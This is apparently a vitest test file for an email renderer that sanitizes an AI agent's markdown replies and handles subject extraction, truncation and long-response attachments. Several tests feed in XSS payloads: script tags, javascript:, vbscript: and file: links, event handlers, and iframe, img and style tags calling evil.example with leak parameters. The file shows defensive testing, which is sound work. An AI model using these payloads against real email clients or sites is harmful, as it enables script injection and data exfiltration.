import { describe, it, expect } from "vitest";
import {
  renderEmailReply,
  extractSubjectAndStrip,
  degradeLongResponse,
  slugifyForFilename,
  truncateSubject,
  MAX_SUBJECT_LEN,
  DEFAULT_INLINE_BODY_LIMIT,
} from "./email-render.js";

describe("renderEmailReply", () => {
  it("renders a heading to <h1> in HTML and strips the # in plain text", () => {
    const { text, html } = renderEmailReply("# Hello world");
    expect(html).toMatch(/<h1[^>]*>Hello world<\/h1>/);
    expect(text).toBe("Hello world");
  });

  it("renders bold/italic markdown into HTML tags", () => {
    const { html } = renderEmailReply("This is **bold** and *italic*.");
    expect(html).toMatch(/<strong>bold<\/strong>/);
    expect(html).toMatch(/<em>italic<\/em>/);
  });

  it("renders fenced code blocks as <pre><code>", () => {
    const md = "```js\nconst x = 1;\n```";
    const { html, text } = renderEmailReply(md);
    expect(html).toMatch(/<pre><code[^>]*>const x = 1;\n<\/code><\/pre>/);
    // Plain text version drops the fence markers but keeps the content
    expect(text).toContain("const x = 1;");
    expect(text).not.toContain("```");
  });

  it("renders unordered lists into <ul><li>", () => {
    const md = "- one\n- two\n- three";
    const { html, text } = renderEmailReply(md);
    expect(html).toMatch(/<ul>[\s\S]*<li>one<\/li>[\s\S]*<\/ul>/);
    // Plain text normalizes bullet style
    expect(text).toContain("- one");
  });

  it("renders links as <a href> with the url", () => {
    const md = "See [the docs](https://example.com).";
    const { html } = renderEmailReply(md);
    expect(html).toMatch(/<a href="https:\/\/example\.com">the docs<\/a>/);
  });

  it("strips raw <script> tags AND their contents — XSS guardrail", () => {
    // The model's output is influenced by user input. Inline HTML must
    // not pass through to email clients verbatim. sanitize-html strips
    // disallowed tags entirely (more secure than escaping — eliminates
    // any chance of double-decode bypasses).
    const md = 'Look out: <script>alert("pwn")</script>';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("alert");
    expect(html).not.toContain("pwn");
  });

  it("escapes HTML inside code spans too", () => {
    const md = "Use `<div>` to wrap.";
    const { html } = renderEmailReply(md);
    expect(html).not.toMatch(/<code[^>]*><div><\/code>/);
    expect(html).toContain("&lt;div&gt;");
  });

  it("strips javascript: links — XSS guardrail", () => {
    const md = "[click me](javascript:alert('pwn'))";
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("javascript:");
  });

  it("strips data: URIs in links", () => {
    const md = "[click me](data:text/html,<script>alert(1)</script>)";
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("data:");
    expect(html).not.toContain("<script>");
  });

  // RT-2026-04-30-009 — pin the sanitize-html allowlist. The audit
  // flagged the lack of regression coverage for tags beyond <script>;
  // these assertions break loudly if the allowlist is ever loosened.
  it("RT-2026-04-30-009: strips <iframe> tags entirely", () => {
    const md = 'Embed: <iframe src="https://evil.example/x"></iframe>';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("<iframe");
    expect(html).not.toContain("evil.example");
  });

  it("RT-2026-04-30-009: strips <style> tags from agent body (CSS exfil / display attacks)", () => {
    const md = "<style>body{background:url('https://evil.example/?leak=1')}</style>Body text";
    const { html } = renderEmailReply(md);
    // Static shell legitimately includes a <style>…</style> block, so
    // scope the assertion to the rendered body region.
    const body = html.slice(html.indexOf("<body>"), html.indexOf("</body>"));
    expect(body).not.toContain("<style");
    expect(body).not.toContain("evil.example");
  });

  it("RT-2026-04-30-009: strips inline event handlers (onload / onerror / onclick)", () => {
    const md = '<div onload="alert(1)">x</div> <a href="https://x.com" onclick="alert(2)">y</a>';
    const { html } = renderEmailReply(md);
    expect(html).not.toMatch(/onload\s*=/i);
    expect(html).not.toMatch(/onclick\s*=/i);
    expect(html).not.toContain("alert");
  });

  it("RT-2026-04-30-009: strips <img> entirely (no inline images, kills tracking-pixel exfil)", () => {
    const md = '<img src="https://evil.example/?leak=secret" onerror="alert(1)">';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).not.toMatch(/onerror\s*=/i);
  });

  it("RT-2026-04-30-009: strips <object>, <embed>, <link>, <meta> from agent body", () => {
    const md =
      '<object data="x.swf"></object>' +
      '<embed src="x.swf">' +
      '<link rel="stylesheet" href="https://evil.example/x.css">' +
      '<meta http-equiv="refresh" content="0;url=https://evil.example">';
    const { html } = renderEmailReply(md);
    // Static shell has its own <meta charset>; scope to body region.
    const body = html.slice(html.indexOf("<body>"), html.indexOf("</body>"));
    expect(body).not.toContain("<object");
    expect(body).not.toContain("<embed");
    expect(body).not.toContain("<link");
    expect(body).not.toContain("<meta");
    expect(body).not.toContain("evil.example");
  });

  it("RT-2026-04-30-009: blocks vbscript: links", () => {
    const md = "[click me](vbscript:msgbox(1))";
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("vbscript:");
  });

  it("RT-2026-04-30-009: blocks file: links", () => {
    const md = "[open](file:///etc/passwd)";
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("file:");
  });

  it("strips on* event handlers from any tag that slipped through", () => {
    // Even though marked wouldn't generate this, defense in depth: if
    // raw HTML somehow lands in the rendered output, on* attributes
    // must not survive sanitization.
    const md = '<p onclick="alert(1)">hi</p>';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("onclick");
  });

  it("strips <img> entirely (img is not in the allowedTags list)", () => {
    // The classic XSS vector — <img src=x onerror=alert(1)>. img is not
    // an allowed tag, so the whole element is stripped, taking onerror
    // with it. Asserting both the tag AND the handler attribute keeps
    // this test honest if the allowlist ever changes to include img.
    const md = '<img src=x onerror="alert(1)">';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });

  it("strips iframe and style tags from raw HTML in markdown", () => {
    const md = '<iframe src="https://evil.com"></iframe><style>body{display:none}</style>real content';
    const { html } = renderEmailReply(md);
    expect(html).not.toContain("<iframe");
    expect(html).not.toMatch(/<style>body\{display:none\}<\/style>/);
    expect(html).toContain("real content");
  });

  it("preserves http and https links unchanged", () => {
    const md = "[ok](https://example.com) and [also](http://example.org)";
    const { html } = renderEmailReply(md);
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('href="http://example.org"');
  });

  it("preserves mailto links", () => {
    const md = "[mail](mailto:a@b.com)";
    const { html } = renderEmailReply(md);
    expect(html).toContain('href="mailto:a@b.com"');
  });

  it("wraps the body in a complete HTML document", () => {
    const { html } = renderEmailReply("hello");
    expect(html.startsWith("<!doctype html>")).toBe(true);
    expect(html).toContain("<head>");
    expect(html).toContain("<body>");
    expect(html.endsWith("</html>")).toBe(true);
  });

  it("includes the minimal style block for code, quotes, tables", () => {
    const { html } = renderEmailReply("hi");
    expect(html).toContain("font-family");
    expect(html).toMatch(/pre\s*\{[^}]*background/);
  });

  it("treats single newlines as line breaks (gfm breaks: true)", () => {
    const md = "line one\nline two";
    const { html } = renderEmailReply(md);
    expect(html).toMatch(/line one\s*<br\s*\/?>\s*line two/);
  });

  it("handles an empty body without throwing", () => {
    const { text, html } = renderEmailReply("");
    expect(text).toBe("");
    // The wrapper is still present even with empty content
    expect(html).toContain("<body>");
  });

  it("preserves bold/italic markers in plain text (intentional, see comment)", () => {
    const { text } = renderEmailReply("This is **bold**.");
    expect(text).toContain("**bold**");
  });
});

describe("extractSubjectAndStrip", () => {
  it("lifts a leading H1 as subject and strips it from the body", () => {
    const md = "# Quantum computing roundup\n\nFive papers this week. Two worth your time.";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBe("Quantum computing roundup");
    expect(body).toBe("Five papers this week. Two worth your time.");
  });

  it("handles the H1 being preceded by blank lines", () => {
    const md = "\n\n# The actual title\n\nbody here";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBe("The actual title");
    expect(body).toBe("body here");
  });

  it("returns body unchanged if first non-blank line is not an H1", () => {
    const md = "Hi! Just a quick note.\n\n# Section header in the middle";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBeUndefined();
    expect(body).toBe(md);
  });

  it("ignores H2 / H3 / etc — only H1 counts as a title", () => {
    const md = "## Not a title\n\nbody";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBeUndefined();
    expect(body).toBe(md);
  });

  it("ignores `#text` (no space) — that is not a valid ATX H1", () => {
    const md = "#tag-not-heading\n\nbody";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBeUndefined();
    expect(body).toBe(md);
  });

  it("strips a trailing closing-hash decoration on the H1", () => {
    // Some markdown styles allow `# Title #` — the trailing # is decoration
    const md = "# Title #\n\nbody";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBe("Title");
    expect(body).toBe("body");
  });

  it("truncates pathologically long subjects with an ellipsis", () => {
    const longTitle = "x".repeat(200);
    const { subject } = extractSubjectAndStrip(`# ${longTitle}\n\nbody`);
    expect(subject).toBeDefined();
    expect(subject!.length).toBeLessThanOrEqual(120);
    expect(subject!.endsWith("...")).toBe(true);
  });

  it("returns body unchanged for an empty string", () => {
    const { subject, body } = extractSubjectAndStrip("");
    expect(subject).toBeUndefined();
    expect(body).toBe("");
  });

  it("returns body unchanged for whitespace-only input", () => {
    const { subject, body } = extractSubjectAndStrip("   \n\n   ");
    expect(subject).toBeUndefined();
    expect(body).toBe("   \n\n   ");
  });

  it("handles a body that is ONLY an H1 (no remaining content)", () => {
    const { subject, body } = extractSubjectAndStrip("# Just a title");
    expect(subject).toBe("Just a title");
    expect(body).toBe("");
  });

  it("preserves the rest of a multi-paragraph body intact", () => {
    const md = "# Title\n\nFirst paragraph.\n\nSecond paragraph with **bold**.\n\n- list item\n- list item";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBe("Title");
    expect(body).toBe("First paragraph.\n\nSecond paragraph with **bold**.\n\n- list item\n- list item");
  });

  it("does NOT match an H1 with empty content (`# ` alone)", () => {
    // `# ` with nothing after the space is not a useful subject — treat
    // as not-a-subject so we fall back to the inbound subject.
    const md = "#  \n\nbody";
    const { subject, body } = extractSubjectAndStrip(md);
    expect(subject).toBeUndefined();
    expect(body).toBe(md);
  });
});

describe("truncateSubject", () => {
  it("returns the subject unchanged when under the cap", () => {
    expect(truncateSubject("short subject")).toBe("short subject");
  });

  it("returns unchanged at exactly the cap (inclusive boundary)", () => {
    const exact = "x".repeat(MAX_SUBJECT_LEN);
    expect(truncateSubject(exact)).toBe(exact);
  });

  it("truncates and appends an ellipsis when over the cap", () => {
    const tooLong = "x".repeat(MAX_SUBJECT_LEN + 50);
    const out = truncateSubject(tooLong);
    expect(out.length).toBe(MAX_SUBJECT_LEN);
    expect(out.endsWith("...")).toBe(true);
  });

  it("trims trailing whitespace before the ellipsis (no 'word  ...' tails)", () => {
    // Build a string where the slice point lands on a space.
    const subject = "a".repeat(MAX_SUBJECT_LEN - 5) + "    suffix";
    const out = truncateSubject(subject);
    expect(out).toMatch(/[^\s]\.\.\.$/);
  });

  it("respects a custom maxLen", () => {
    expect(truncateSubject("hello world", 8)).toBe("hello...");
  });

  it("caps the absurdly-long subject from test 4.3.e", () => {
    // Direct regression for the Phase 4 test — a 250-char subject must
    // come back capped, not verbatim.
    const subject =
      "This is an intentionally absurd subject line meant to exercise the safe-boundary truncation logic for outbound replies because RFC 5322 technically allows much longer than this but inbox panes truncate around 70 to 90 characters and that is what we are checking here today";
    const out = truncateSubject("Re: " + subject);
    expect(out.length).toBeLessThanOrEqual(MAX_SUBJECT_LEN);
    expect(out.startsWith("Re: ")).toBe(true);
    expect(out.endsWith("...")).toBe(true);
  });
});

describe("degradeLongResponse", () => {
  it("returns the body untouched when it fits under the limit", () => {
    const body = "A short response.";
    const out = degradeLongResponse(body);
    expect(out.body).toBe(body);
    expect(out.attachment).toBeUndefined();
  });

  it("returns untouched at exactly the limit (inclusive boundary)", () => {
    // Build a body of exactly the default limit.
    const body = "x".repeat(DEFAULT_INLINE_BODY_LIMIT);
    const out = degradeLongResponse(body);
    expect(out.body).toBe(body);
    expect(out.attachment).toBeUndefined();
  });

  it("degrades when body exceeds the limit and attaches the full markdown", () => {
    // Well over the default — 40k chars of filler.
    const body = "word ".repeat(8_000); // 40,000 chars
    const out = degradeLongResponse(body);
    expect(out.attachment).toBeDefined();
    expect(out.attachment!.filename).toBe("full-response.md");
    expect(out.attachment!.contentType).toBe("text/markdown; charset=utf-8");
    // Attachment is the ORIGINAL body verbatim — nothing lost.
    expect(out.attachment!.content.toString("utf8")).toBe(body);
    // Inline body is much shorter than the original.
    expect(out.body.length).toBeLessThan(body.length);
    // Footer tells the user about the attachment + the size.
    expect(out.body).toMatch(/full-response\.md/);
    expect(out.body).toMatch(/characters/);
    expect(out.body).toMatch(/words/);
  });

  it("prefers a paragraph-break boundary for the inline preview when possible", () => {
    // First paragraph is short, then a huge blob.
    const firstPara = "Here is the TL;DR: the answer is 42.";
    const restFiller = "x ".repeat(10_000);
    const body = firstPara + "\n\n" + restFiller;
    const out = degradeLongResponse(body);
    expect(out.attachment).toBeDefined();
    // The inline preview should start with the first paragraph.
    expect(out.body.startsWith(firstPara)).toBe(true);
    // And should NOT contain the filler tail — we cut at the paragraph break.
    expect(out.body).not.toContain("x x x x x x x x");
  });

  it("honors a custom limit", () => {
    const body = "a".repeat(500);
    const withSmallLimit = degradeLongResponse(body, 100);
    expect(withSmallLimit.attachment).toBeDefined();
    const withBigLimit = degradeLongResponse(body, 1_000);
    expect(withBigLimit.attachment).toBeUndefined();
  });

  it("uses a sensible preview when there is no paragraph or sentence break", () => {
    // A single unbroken run of characters — falls through to hard-cut + ellipsis.
    const body = "x".repeat(50_000);
    const out = degradeLongResponse(body);
    expect(out.attachment).toBeDefined();
    // Should end with the footer, not the raw body
    expect(out.body).toMatch(/full-response\.md/);
    // Should contain the ellipsis (fallback boundary)
    expect(out.body).toContain("…");
  });

  it("derives the attachment filename from the subject when provided", () => {
    const body = "x".repeat(50_000);
    const out = degradeLongResponse(body, undefined, {
      subject: "Quantum computing roundup — 5 papers",
    });
    expect(out.attachment).toBeDefined();
    expect(out.attachment!.filename).toBe("quantum-computing-roundup-5-papers.md");
    // The body footer references the same name.
    expect(out.body).toMatch(/quantum-computing-roundup-5-papers\.md/);
  });

  it("falls back to full-response.md when subject yields an empty slug", () => {
    const body = "x".repeat(50_000);
    // Cyrillic subject — \w in slugifyForFilename strips non-ASCII.
    const out = degradeLongResponse(body, undefined, {
      subject: "Ответ: вопрос",
    });
    expect(out.attachment!.filename).toBe("full-response.md");
  });

  it("falls back to full-response.md when no subject is passed", () => {
    const body = "x".repeat(50_000);
    const out = degradeLongResponse(body);
    expect(out.attachment!.filename).toBe("full-response.md");
  });
});

describe("slugifyForFilename", () => {
  it("lowercases and collapses whitespace to hyphens", () => {
    expect(slugifyForFilename("Hello World")).toBe("hello-world");
    expect(slugifyForFilename("  multi   space  ")).toBe("multi-space");
  });

  it("strips punctuation and collapses adjacent hyphens", () => {
    expect(slugifyForFilename("Q3 numbers — 2026 update!")).toBe(
      "q3-numbers-2026-update",
    );
  });

  it("keeps only ASCII word characters", () => {
    // Non-ASCII characters are intentionally dropped — mail clients
    // vary in their UTF-8 attachment-filename support.
    expect(slugifyForFilename("Ответ на вопрос")).toBe("");
    expect(slugifyForFilename("café notes")).toBe("caf-notes");
  });

  it("trims to the requested max length without leaving a trailing hyphen", () => {
    const long = "alpha bravo charlie delta echo foxtrot golf hotel india";
    const slug = slugifyForFilename(long, 30);
    expect(slug.length).toBeLessThanOrEqual(30);
    expect(slug.endsWith("-")).toBe(false);
  });

  it("returns empty for prefix-only or symbol-only input (caller falls back)", () => {
    expect(slugifyForFilename("")).toBe("");
    expect(slugifyForFilename("!!!")).toBe("");
    expect(slugifyForFilename("---")).toBe("");
  });
});
